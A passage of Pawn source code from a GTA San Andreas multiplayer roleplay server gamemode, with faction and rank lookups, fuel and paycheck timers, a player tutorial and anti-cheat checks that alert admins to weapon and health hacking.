  		case 0, 1:
		{
			Player[playerid][pWeapon][0] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 2, 3, 4, 5, 6, 7, 8, 9:
		{
			Player[playerid][pWeapon][1] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 22, 23, 24:
		{
			Player[playerid][pWeapon][2] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 25, 26, 27:
		{
			Player[playerid][pWeapon][ 3 ] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 28, 29, 32:
		{
			Player[playerid][pWeapon][4] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 30, 31:
		{
			Player[playerid][pWeapon][5] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 33, 34:
		{
			Player[playerid][pWeapon][6] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 35, 36, 37, 38:
		{
			Player[playerid][pWeapon][7] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 16, 17, 18, 39, 40:
		{
			Player[playerid][pWeapon][8] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 41, 42, 43:
		{
			Player[playerid][pWeapon][9] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 10, 11, 12, 13, 14, 15:
		{
			Player[playerid][pWeapon][10] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
		case 44, 45, 46:
		{
			Player[playerid][pWeapon][11] = weaponid;
			GivePlayerWeapon(playerid, weaponid, ammo);
		}
	}
	return 1;
}
stock RPFN(playerid)
{
	new facname[32];
	if(Player[playerid][pFac] == 0) format(facname, sizeof(facname), "None");
	else if(Player[playerid][pFac] == 1) format(facname, sizeof(facname), "LSPD");
	else if(Player[playerid][pFac] == 2) format(facname, sizeof(facname), "GOV");
	else if(Player[playerid][pFac] == 3) format(facname, sizeof(facname), "HA");
	else if(Player[playerid][pFac] == 4) format(facname, sizeof(facname), "News");
	else if(Player[playerid][pFac] == 5) format(facname, sizeof(facname), "LSFMD");
	else if(Player[playerid][pFac] == 6) format(facname, sizeof(facname), "FBI");
	else if(Player[playerid][pFac] == 7) format(facname, sizeof(facname), "DOC");
	return facname;
}

stock RPFNEx(playerid)
{
	new facname[128];
	if(Player[playerid][pFac] == 0) format(facname, sizeof(facname), "None");
	else if(Player[playerid][pFac] == 1) format(facname, sizeof(facname), "Los Santos Police Department");
	else if(Player[playerid][pFac] == 2) format(facname, sizeof(facname), "Government");
	else if(Player[playerid][pFac] == 3) format(facname, sizeof(facname), "Hitman Agency");
	else if(Player[playerid][pFac] == 4) format(facname, sizeof(facname), "News Agency");
	else if(Player[playerid][pFac] == 5) format(facname, sizeof(facname), "Los Santos Fire & Medic Department");
	else if(Player[playerid][pFac] == 6) format(facname, sizeof(facname), "Federal Bureau Of Investigation");
	else if(Player[playerid][pFac] == 7) format(facname, sizeof(facname), "Department Of Correction");
	return facname;
}

stock RPFaRN(playerid)
{
	new rankname[32];
	if(Player[playerid][pFamRank] == 0 && Player[playerid][pFam] == 0) format(rankname, sizeof(rankname), "None");
	else if(Player[playerid][pFam])
	{
		if(Player[playerid][pFamRank] == 1) format(rankname, sizeof(rankname), "%s", FamInfo[Player[playerid][pFam]][fRank1]);
		else if(Player[playerid][pFamRank] == 2) format(rankname, sizeof(rankname), "%s", FamInfo[Player[playerid][pFam]][fRank2]);
		else if(Player[playerid][pFamRank] == 3) format(rankname, sizeof(rankname), "%s", FamInfo[Player[playerid][pFam]][fRank3]);
		else if(Player[playerid][pFamRank] == 4) format(rankname, sizeof(rankname), "%s", FamInfo[Player[playerid][pFam]][fRank4]);
		else if(Player[playerid][pFamRank] == 5) format(rankname, sizeof(rankname), "%s", FamInfo[Player[playerid][pFam]][fRank5]);
		else if(Player[playerid][pFamRank] == 6) format(rankname, sizeof(rankname), "%s", FamInfo[Player[playerid][pFam]][fRank6]);
	}
	return rankname;
}

stock RPFaN(playerid)
{
    new famname[32];
    if(!Player[playerid][pFam]) format(famname, sizeof(famname), "None");
    else format(famname, sizeof(famname), "%s", FamInfo[Player[playerid][pFam]][fName]);
    return famname;
}

stock RFaN(idx)
{
    new famname[32];
    if(!idx) format(famname, sizeof(famname), "None");
    else format(famname, sizeof(famname), "%s", FamInfo[idx][fName]);
    return famname;
}

stock RPFRN(playerid)
{
	new rankname[32];
	if(Player[playerid][pFacRank] == 0 && Player[playerid][pFac] == 0) format(rankname, sizeof(rankname), "Civilian");
	else if(Player[playerid][pFac])
	{
		if(Player[playerid][pFacRank] == 1) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank1]);
		else if(Player[playerid][pFacRank] == 2) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank2]);
		else if(Player[playerid][pFacRank] == 3) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank3]);
		else if(Player[playerid][pFacRank] == 4) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank4]);
		else if(Player[playerid][pFacRank] == 5) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank5]);
		else if(Player[playerid][pFacRank] == 6) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank6]);
		else if(Player[playerid][pFacRank] == 7) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank7]);
		else if(Player[playerid][pFacRank] == 8) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank8]);
		else if(Player[playerid][pFacRank] == 9) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank9]);
		else if(Player[playerid][pFacRank] == 10) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank10]);
		else if(Player[playerid][pFacRank] == 11) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank11]);
		else if(Player[playerid][pFacRank] == 12) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank12]);
		else if(Player[playerid][pFacRank] == 13) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank13]);
		else if(Player[playerid][pFacRank] == 14) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank14]);
		else if(Player[playerid][pFacRank] == 15) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank15]);
		else if(Player[playerid][pFacRank] == 16) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank16]);
		else if(Player[playerid][pFacRank] == 17) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank17]);
		else if(Player[playerid][pFacRank] == 18) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank18]);
		else if(Player[playerid][pFacRank] == 19) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank19]);
		else if(Player[playerid][pFacRank] == 20) format(rankname, sizeof(rankname), "%s", FacInfo[Player[playerid][pFac]][fRank20]);
	}
	return rankname;
}

stock RPFL(playerid)
{
	new leader[4];
	if(Player[playerid][pFacLeader] == 0) format(leader, sizeof(leader), "No");
	else if(Player[playerid][pFacLeader] == 1) format(leader, sizeof(leader), "Yes");
	return leader;
}

stock RPFDN(playerid)
{
	new divname[8];
	if(Player[playerid][pFac] == 1)
	{
		if(Player[playerid][pFacDiv] == 1) format(divname, sizeof(divname), "%s", FacInfo[1][fDiv1]);
		else if(Player[playerid][pFacDiv] == 2) format(divname, sizeof(divname), "%s", FacInfo[1][fDiv2]);
		else if(Player[playerid][pFacDiv] == 3) format(divname, sizeof(divname), "%s", FacInfo[1][fDiv3]);
		else if(Player[playerid][pFacDiv] == 4) format(divname, sizeof(divname), "%s", FacInfo[1][fDiv4]);
		else if(Player[playerid][pFacDiv] == 5) format(divname, sizeof(divname), "%s", FacInfo[1][fDiv5]);
		else if(Player[playerid][pFacDiv] == 6) format(divname, sizeof(divname), "%s", FacInfo[1][fDiv6]);
		else if(Player[playerid][pFacDiv] == 7) format(divname, sizeof(divname), "%s", FacInfo[1][fDiv7]);
		else if(Player[playerid][pFacDiv] == 8) format(divname, sizeof(divname), "%s", FacInfo[1][fDiv8]);
	}
	if(Player[playerid][pFac] == 6)
	{
		if(Player[playerid][pFacDiv] == 1) format(divname, sizeof(divname), "%s", FacInfo[6][fDiv1]);
		else if(Player[playerid][pFacDiv] == 2) format(divname, sizeof(divname), "%s", FacInfo[6][fDiv2]);
		else if(Player[playerid][pFacDiv] == 3) format(divname, sizeof(divname), "%s", FacInfo[6][fDiv3]);
		else if(Player[playerid][pFacDiv] == 4) format(divname, sizeof(divname), "%s", FacInfo[6][fDiv4]);
		else if(Player[playerid][pFacDiv] == 5) format(divname, sizeof(divname), "%s", FacInfo[6][fDiv5]);
		else if(Player[playerid][pFacDiv] == 6) format(divname, sizeof(divname), "%s", FacInfo[6][fDiv6]);
		else if(Player[playerid][pFacDiv] == 7) format(divname, sizeof(divname), "%s", FacInfo[6][fDiv7]);
		else if(Player[playerid][pFacDiv] == 8) format(divname, sizeof(divname), "%s", FacInfo[6][fDiv8]);
	}
	if(Player[playerid][pFacDiv] == 0) format(divname, sizeof(divname), "None");
	return divname;
}



stock RPFDL(playerid)
{
	new leader[4];
	if(Player[playerid][pFacDivLeader] == 0) format(leader, sizeof(leader), "No");
	else format(leader, sizeof(leader), "Yes");
	return leader;
}


stock IsHoldingFirearm(playerid)
{
	if(GetPlayerWeapon(playerid) < 16) return 0;
	if(GetPlayerWeapon(playerid) > 40) return 0;
	return 1;
}



stock TogglePlayerTazed(playerid, status)
{
	Tazed[playerid] = status;
	return 1;
}


stock IsPlayerTazed(playerid)
{
	if(!Tazed[playerid]) return 0;
	if(Tazed[playerid]) return 1;
	return 1;
}

stock TogglePlayerTied(playerid, status)
{
	Tied[playerid] = status;
	return 1;
}
stock IsPlayerTied(playerid)
{
	if(!Tied[playerid]) return 0;
	if(Tied[playerid]) return 1;
	return 1;
}

stock TogglePlayerCuffed(playerid, status)
{
	Cuffed[playerid] = status;
	return 1;
}
stock IsPlayerCuffed(playerid)
{
	if(!Cuffed[playerid]) return 0;
	if(Cuffed[playerid]) return 1;
	return 1;
}

// TIMERS
forward FamedPoints();
public FamedPoints()
{
	if(FHealth) FHealth --;
	if(FFix) FFix --;
	if(FRefill) FRefill --;
	return 1;
}

forward FishingTime(playerid);
public FishingTime(playerid)
{
    FishTime[playerid] --;
    if(FishTime[playerid] < 0)
    {
        FishTime[playerid] = 0;
    }
	if(FishTime[playerid] > 0)
	{
		SetTimerEx("FishingTime", 1000, false, "i", playerid);
	}

	return 1;
}


forward FalseBanFix(playerid);
public FalseBanFix(playerid)
{
    FalseBan[playerid] = 1;
	return 1;
}

forward RefillTimer(playerid);
public RefillTimer(playerid)
{
    new engine, lights, alarm, doors, bonnet, boot, objective, string[128];
	GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || engine)
	{
	    GiveZamoraMoney(playerid, -(Refill[playerid]*2));
	    format(string, sizeof(string), "* %s has stopped refilling their vehicle.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    format(string, sizeof(string), " You have refilled your vehicle for $%d.", (Refill[playerid]*2));
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    Refill[playerid] = 0;
	    return 1;
	}
	new veh = GetPlayerVehicleID(playerid);
	Refill[playerid] ++;
	Fuel[veh] ++;
	if(Fuel[veh] >= 100 || Player[playerid][pMoney]-10 <= (Refill[playerid]*10))
	{
	    GiveZamoraMoney(playerid, -(Refill[playerid]*10));
	    if(PointInfo[2][pOwner])
        {
    		new idx = PointInfo[2][pOwner];
    		FamInfo[idx][fMoney] += Refill[playerid]*10;
    		PointInfo[2][pProfit] += Refill[playerid]*10;
        }
	    format(string, sizeof(string), "* %s has stopped refilling their vehicle.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    format(string, sizeof(string), " You have refilled your vehicle for $%d.", (Refill[playerid]*10));
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    Refill[playerid] = 0;
	    return 1;
	}
	if(Fuel[veh] < 100)
	{
	    SetTimerEx("RefillTimer", 1000, false, "i", playerid);
	}
	return 1;
}

forward FuelTimer();
public FuelTimer()
{
	for(new vehid=0; vehid < MAX_VEHICLES; vehid++)
	{
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective);
		if(engine && Fuel[vehid])
		{
		    FuelVar[vehid] ++;
		    if(GetVehicleSpeed(vehid, 0) != 0 && FuelVar[vehid] >= 72/2 && !IsABike(vehid))
		    {
		        FuelVar[vehid] = 0;
				Fuel[vehid] --;
			}
			else if(GetVehicleSpeed(vehid, 0) == 0 && FuelVar[vehid] >= 108/2 && !IsABike(vehid))
		    {
		        FuelVar[vehid] = 0;
				Fuel[vehid] --;
			}
		}
	}
	return 1;
}
forward PaycheckTimer();
public PaycheckTimer()
{
	foreach(Player, i)
	{
    	TextDrawHideForPlayer(i, Paycheck0);
    	TextDrawHideForPlayer(i, Paycheck1);
    	TextDrawHideForPlayer(i, Paycheck2);
    	TextDrawHideForPlayer(i, Paycheck3);
    }
	return 1;
}



forward AltTabTimer();
public AltTabTimer()
{
    foreach(Player, i)
    {
        if(Logged(i))
		{
		    // AFK Detection
			GetPlayerPos(i, NewPos[i][0], NewPos[i][1], NewPos[i][2]);
			if(IsPlayerInRangeOfPoint(i, 3, OldPos[i][0], OldPos[i][1], OldPos[i][2])) {AFK[i] ++;} else {AFK[i] = 0;}
			GetPlayerPos(i, OldPos[i][0], OldPos[i][1], OldPos[i][2]);
			if(AFK[i] >= 600)
			{
			    if(!IsAFK[i])
			    {
					IsAFK[i] = 1;
					SendClientMessage(i, COLOR_INT, "You've been marked as 'Away From Keyboard', as you are in the same area for 10 minutes.");
			    //	AFKText[i] = CreateDynamic3DTextLabel("AFK", COLOR_CYAN, 0, 0, -20, 25, i);
			    //	fa(STREAMER_TYPE_3D_TEXT_LABEL,AFKText[i] , E_STREAMER_ATTACH_OFFSET_Z, 0.35);
				}
			}
			else if(AFK[i] == 0)
			{
				if(IsAFK[i])
				{
					IsAFK[i] = 0;
					SendClientMessage(i, COLOR_INT, "You are not marked as 'Away From Keyboard' anymore.");
                    //Delete3DTextLabel(AFKText[i]);
                   // if(IsValidDynamic3DTextLabel(AFKText[i])) DestroyDynamic3DTextLabel(AFKText[i]);
				}
			}
		    // Alt-Tab Detection
		    AltTabbed[i] ++;
		    if(AltTabbed[i] < 2)
			{
				if(HasText[i])
				{
				    HasText[i] = 0;
					//Delete3DTextLabel(AltTabText[i]);
					if(IsValidDynamic3DTextLabel(AltTabText[i])) DestroyDynamic3DTextLabel(AltTabText[i]);
				}
			}
		    if(AltTabbed[i] > 2) {Tabbed[i] = 1;}
		    else Tabbed[i] = 0;
			if(Tabbed[i])
			{
				if(Event[i])
				{
				    new string[128];
					format(string, sizeof(string), "AdminWarning: %s is alt-tabbed inside the event.", GetName(i));
				    SendAdminMessage(COLOR_ADMWARN,  string);
			    }
			}
		}
	}
	return 1;
}
forward AntiTPHacks(playerid);
public AntiTPHacks(playerid)
{
	AntiTP[playerid] = 0;
	return 1;
}

forward PayCheckDone();
public PayCheckDone()
{
    PayChecks = 0;
	return 1;
}
forward HealthHackCheck(playerid, giveplayerid);
public HealthHackCheck(playerid, giveplayerid)
{
	new string[128];
 	if(giveplayerid == INVALID_PLAYER_ID)
    {
        SendClientMessage(playerid, COLOR_GRAD2, "Player has logged off, causing the health hacks check to be cancelled.");
        HHcheckUsed = 0;
        return 1;
    }
    if(!IsPlayerInRangeOfPoint(giveplayerid,20,-1400.994873, 106.899650, 1032.273437))
    {
        SendClientMessage(playerid, COLOR_GRAD2, "Player is either desynced, lagging or using NOP SetPlayerPos hacks, the health hacks check has been cancelled.");

		SetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
		SetPlayerArmour(giveplayerid, HHcheckFloats[giveplayerid][1]);
		SetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
		SetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
		SetCameraBehindPlayer(giveplayerid);
		SetPlayerVirtualWorld(giveplayerid, HHcheckVW[giveplayerid]);
 		SetPlayerInterior(giveplayerid, HHcheckInt[giveplayerid]);

  		for(new i = 0; i < 6; i++)
		{
			HHcheckFloats[giveplayerid][i] = 0;
		}
		HHcheckVW[giveplayerid] = 0;
		HHcheckInt[giveplayerid] = 0;

        HHcheckUsed = 0;
		return 1;
    }

    new Float:health;
    GetPlayerHealth(giveplayerid, health);
    if(health == 100)
	{
	    format(string, sizeof(string), "HealthHackWarn: (POSITIVE) %s may be health hacking.", GetName(giveplayerid));
	    SendAdminMessage(COLOR_ADMWARN,  string);
    }
    else
	{
		format(string, sizeof(string), "HealthHackWarn: (NEGATIVE) %s is not health hacking.", GetName(giveplayerid));
	    SendAdminMessage(COLOR_ADMWARN,  string);
    }

	SetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
	SetPlayerArmour(giveplayerid, HHcheckFloats[giveplayerid][1]);
	SetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
	SetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
	SetCameraBehindPlayer(giveplayerid);
	SetPlayerVirtualWorld(giveplayerid, HHcheckVW[giveplayerid]);
 	SetPlayerInterior(giveplayerid, HHcheckInt[giveplayerid]);

  	for(new i = 0; i < 6; i++)
	{
		HHcheckFloats[giveplayerid][i] = 0;
	}
	HHcheckVW[giveplayerid] = 0;
	HHcheckInt[giveplayerid] = 0;

    HHcheckUsed = 0;
    return 1;
}

forward WeaponCheat();
public WeaponCheat()
{
	foreach(Player, playerid)
	{
		// Weapon Anticheat
	    if(Logged(playerid) && !GunsBeingRemoved[playerid] && FalseBan[playerid] && !IsPlayerAnAdmin(playerid))
	    {
		    if(GetPlayerWeapon(playerid) != Player[playerid][pWeapon][0] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][1] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][2] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][3] &&
			GetPlayerWeapon(playerid) != Player[playerid][pWeapon][4] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][5] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][6] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][7] &&
			GetPlayerWeapon(playerid) != Player[playerid][pWeapon][8] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][9] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][10] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][11] && GetPlayerWeapon(playerid) != Player[playerid][pWeapon][12] &&
			GetPlayerWeapon(playerid) != EventWep[0] && GetPlayerWeapon(playerid) != EventWep[1] && GetPlayerWeapon(playerid) != EventWep[2] && GetPlayerWeapon(playerid) != PaintballWep[0] && GetPlayerWeapon(playerid) != PaintballWep[1])
		    {
		        if(GetPlayerState(playerid) != PLAYER_STATE_EXIT_VEHICLE || GetPlayerState(playerid) != PLAYER_STATE_ENTER_VEHICLE_DRIVER || GetPlayerState(playerid) != PLAYER_STATE_ENTER_VEHICLE_PASSENGER)
		        {
		            if(GetPlayerWeapon(playerid) != 46)
		            {
				        new string[128];
					/*	format(string, sizeof(string), "AdmCmd: %s has been auto-banned by "ANTIHACK", reason: Weapon Hacking (%s)", GetName(playerid), RWN(GetPlayerWeapon(playerid)));
		                SendClientMessageToAll(COLOR_LIGHTRED, string);
		                Log("Log/Admins/ban.log", string);
						// Banreason
						new file[32];
						format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
						format(string, sizeof(string), "Weapon Hacks (%s)", RWN(GetPlayerWeapon(playerid)));
						dini_Set(file, "BanReason", string);
						dini_Set(file, "BannedBy", ""ANTIHACK"");
						Player[playerid][pBanned] = 1;
						AddBan(playerid);
						Kick(playerid);*/ //Not for now.
	 					format(string, sizeof(string), "AdminWarning: %s(%d) might be Desynced or using Weapon Hacking. (%s)", GetName(playerid), playerid, RWN(GetPlayerWeapon(playerid)));
                        SendAdminMessage(COLOR_ADMWARN,  string);
					}
				}
		    }
	    }
	    if(GunsBeingRemoved[playerid]) GunsBeingRemoved[playerid] = 0;
	}
	return 1;
}
forward SaveServer();
public SaveServer()
{
	foreach(Player, i)
	{
		if(Logged(i))
		{
		    SaveChar(i);
		}
	}
	SaveObj();
	SaveHouses();
   	SaveFactions();
   	SaveFamilies();
   	SavePoints();
   	SaveDoors();
   	SaveGates();
   	SaveMapIcons();
   	SaveDrugs();
   	SaveMOTDS();
   	SaveTUpdates();
	SaveBusiness();
	return 1;
}
forward DrugTimer(playerid);
public DrugTimer(playerid)
{
	DrugTimeout[playerid] = 0;
	return 1;
}
forward Stoned(playerid);
public Stoned(playerid)
{
	SetPlayerWeather(playerid, 1);
	Player[playerid][pStoned] = 0;
}

forward Tut1(playerid);
public Tut1(playerid)
{
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
    TogglePlayerControllable(playerid, 0);
    SetPlayerCameraPos(playerid, 1668.9432,-1458.1198,120.6119);
    SetPlayerCameraLookAt(playerid,1586.5640,-1281.9943,120.6119);
    SetPlayerPos(playerid,1582.0026,-1274.0721,119.7132);
	SendClientMessage(playerid, COLOR_LIGHTSALMON, "Introduction to International Roleplay - Part One");
	SendClientMessage(playerid, COLOR_WHITE, "This is a Med-Heavy role-play server, which means you have to act as you would in real life, depending on who you're role-playing.");
	SendClientMessage(playerid, COLOR_WHITE, "Please pay attention to avoid asking questions later on.");
	Tut[playerid] = SetTimerEx("Tut2", 10*1000, false, "i", playerid);
	return 1;
}
forward Tut2(playerid);
public Tut2(playerid)
{
	SetPlayerCameraPos(playerid,2324.685303, -2340.955078, 15.422848);
	SetPlayerCameraLookAt(playerid, 2325.380859, -2309.979248, 14.838473);
	SetPlayerPos(playerid,2324.685303, -2340.955078, 0.0000);
    SendClientMessage(playerid, COLOR_LIGHTSALMON, "Procedure to earn cash - Part Two");
    SendClientMessage(playerid, COLOR_WHITE, "There are many jobs located around Los Santos, these are represented by yellow dots/information icons.");
    SendClientMessage(playerid, COLOR_WHITE, "Jobs can be a good source of income.");
    SendClientMessage(playerid, COLOR_WHITE, "You can also do side-jobs in your spare time such as Fishing by the pier.");
    SendClientMessage(playerid, COLOR_WHITE, "You can also withdraw (/withdraw) and deposit (/deposit) your cash in the city Bank of Los Santos.");
	Tut[playerid] = SetTimerEx("Tut3", 20*1000, false, "i", playerid);
	return 1;
}
forward Tut3(playerid);
public Tut3(playerid)
{
	SetPlayerCameraPos(playerid,1508.442627, -1614.123291, 14.966317);
	SetPlayerCameraLookAt(playerid, 1540.993042, -1641.426758, 19.695374);
	SetPlayerPos(playerid,1508.442627, -1614.123291, 0.0000);
    SendClientMessage(playerid, COLOR_LIGHTSALMON, "Public Services & Laws - Part Three");
    SendClientMessage(playerid, COLOR_WHITE, "We have a total of seven factions. We will introduce one of them.");
    SendClientMessage(playerid, COLOR_WHITE, "This is the Los Santos Police Department. If you cause trouble you'll be either wasted or imprisoned.");
    SendClientMessage(playerid, COLOR_WHITE, "Attacked? In trouble? Contact 911 as soon as possible. (/call 911)");
    SendClientMessage(playerid, COLOR_WHITE, "If you wish to apply for any faction, then visit our forums "SERVER_WEB".");
	Tut[playerid] = SetTimerEx("Tut4", 20*1000, false, "i", playerid);
	return 1;
}
forward Tut4(playerid);
public Tut4(playerid)
{
	SetPlayerCameraPos(playerid,1404.699707, -1351.813965, 18.349072);
	SetPlayerCameraLookAt(playerid, 1424.194946, -1318.100342, 12.749156);
	SetPlayerPos(playerid,1404.699707, -1351.813965, 0.0000);
    SendClientMessage(playerid, COLOR_LIGHTSALMON, "Rules & Regulations");
    SendClientMessage(playerid, COLOR_WHITE, "Death-matching is forbidden - don't kill anyone without any valid role-play reason.");
    SendClientMessage(playerid, COLOR_WHITE, "Driver-Drive-By isn't allowed - don't use weapons while sitting in/on a vehicle. However, passengers may drive-by.");
    SendClientMessage(playerid, COLOR_WHITE, "Car-parking is forbidden - you're not suppose to park vehicles to kill a person.");
    SendClientMessage(playerid, COLOR_WHITE, "Forcing to avoid arrest/death is also not allowed.");
    SendClientMessage(playerid, COLOR_WHITE, "Money-Farming/Server Advertising and Hacking will result into a straight ban.");
	Tut[playerid] = SetTimerEx("Tut5", 30*1000, false, "i", playerid);
	return 1;
}
forward Tut5(playerid);
public Tut5(playerid)
{
	SetPlayerCameraPos(playerid,1303.166504, -925.366211, 46.389950);
	SetPlayerCameraLookAt(playerid, 1352.937622, -852.624817, 49.568592);
	SetPlayerPos(playerid,1303.166504, -925.366211, 0.0000);
    SendClientMessage(playerid, COLOR_LIGHTSALMON, "Businesses - Part Four");
    SendClientMessage(playerid, COLOR_WHITE, "We've a total of six types of businesses that can be owned by players. We will introduce one of them.");
    SendClientMessage(playerid, COLOR_WHITE, "A market store where you can purchase items from. Such as Cellphones, Walkie-Talkies etc.");
    SendClientMessage(playerid, COLOR_WHITE, "Normal players can own one business at a time whereas VIP's can own two businesses.");
    SendClientMessage(playerid, COLOR_WHITE, "In order to get a business, contact an administrator to create you one or find a business which is owned by The State.");
	Tut[playerid] = SetTimerEx("Tut6", 20*1000, false, "i", playerid);
	return 1;
}
forward Tut6(playerid);
public Tut6(playerid)
{
	SetPlayerCameraPos(playerid, 1470.760, -892.135, 59.225);
	SetPlayerCameraLookAt(playerid, 1470.164, -895.571, 58.015);
	SetPlayerPos(playerid, 1470.164, -895.571, -5.015);
    SendClientMessage(playerid, COLOR_LIGHTSALMON, "Housing System - Part Five");
    SendClientMessage(playerid, COLOR_WHITE, "We've dyanmic houses which have a total of tweleve levels.");
    SendClientMessage(playerid, COLOR_WHITE, "There is a wide variety of houses across the state of Los Santos that players can purchase.");
	SendClientMessage(playerid, COLOR_WHITE, "If you own a house, you'll be able to store stuff in your house's safe. You can store drugs, materials, cash and weapons.");
    SendClientMessage(playerid, COLOR_WHITE, "Normal players can purchase one house whereas VIP's can purchase up to two houses.");
    SendClientMessage(playerid, COLOR_WHITE, "You can get a house by finding an unowned house that is owned by The State or contact an administrator to create you one.");
	Tut[playerid] = SetTimerEx("TutFinal", 20*1000, false, "i", playerid);
	return 1;
}
forward TutFinal(playerid);
public TutFinal(playerid)
{
    SendClientMessage(playerid, COLOR_LIGHTSALMON, "End of the Tutorial");
    SendClientMessage(playerid, COLOR_WHITE, "This is the end of the tutorial.");
	SendClientMessage(playerid, COLOR_WHITE, "Hopefully, you'll understand these system more thoroughly after the tutorial.");
	SendClientMessage(playerid, COLOR_WHITE, "Remember, if you have any questions, use /newbie or /helpme.");
	SendClientMessage(playerid, COLOR_WHITE, "You can also type /help for a list of commands.");
	Player[playerid][pTutorial] = 1;
	SpawnChar(playerid);
	TogglePlayerControllable(playerid, 1);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	// Starter Package
	Player[playerid][pNew] = 1;
	Player[playerid][pModel] = 230;
	SetPlayerSkin(playerid, 230);
	Player[playerid][pFightStyle] = FIGHT_STYLE_NORMAL;
	return 1;
}

forward FreeTimer(playerid);
public FreeTimer(playerid)
{
	FreeTimeout[playerid] --;
	if(FreeTimeout[playerid] > 0)
	{
	    SetTimerEx("FreeTimer", 1000, false, "i", playerid);
	}
	return 1;
}

forward DefendTimer(playerid);
public DefendTimer(playerid)
{
	DefendTimeout[playerid] --;
	if(DefendTimeout[playerid] > 0)
	{
	    SetTimerEx("DefendTimer", 1000, false, "i", playerid);
	}
	return 1;
}

forward NOPSetPlayerPos();
public NOPSetPlayerPos()
{
    // NOP Vehicle Cheat
    foreach(Player, playerid)
    {
       // new vehicleid = GetPlayerVehicleID(playerid);
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
		    if(IsLeoVehicle(GetPlayerVehicleID(playerid)) && Player[playerid][pFac] != 1 || IsFBIVehicle(GetPlayerVehicleID(playerid)) && Player[playerid][pFac] != 6 || IsDOCVehicle(GetPlayerVehicleID(playerid)) && Player[playerid][pFac] != 7  || IsNewsVehicle(GetPlayerVehicleID(playerid)) && Player[playerid][pFac] != 4 || IsGovVehicle(GetPlayerVehicleID(playerid)) && Player[playerid][pFac] != 2 || IsLSFMDVehicle(GetPlayerVehicleID(playerid)) && Player[playerid][pFac] != 5)
		    {
			    new string[256];
			    format(string, sizeof(string), "AdminWarning: %s is either desynced or using NOP hacks. (Driving Restricted Faction Vehicle)", GetName(playerid));
                SendAdminMessage(COLOR_ADMWARN, string);
			    RemovePlayerFromVehicle(playerid);
		    }
		    if(IsTruckerVehicle(GetPlayerVehicleID(playerid)) && Player[playerid][pJob] != JOB_TRUCKER)
		    {
                new string[256];
			    format(string, sizeof(string), "AdminWarning: %s is either desynced or using NOP hacks. (Driving Restricted Job Vehicle)", GetName(playerid));
                SendAdminMessage(COLOR_ADMWARN, string);
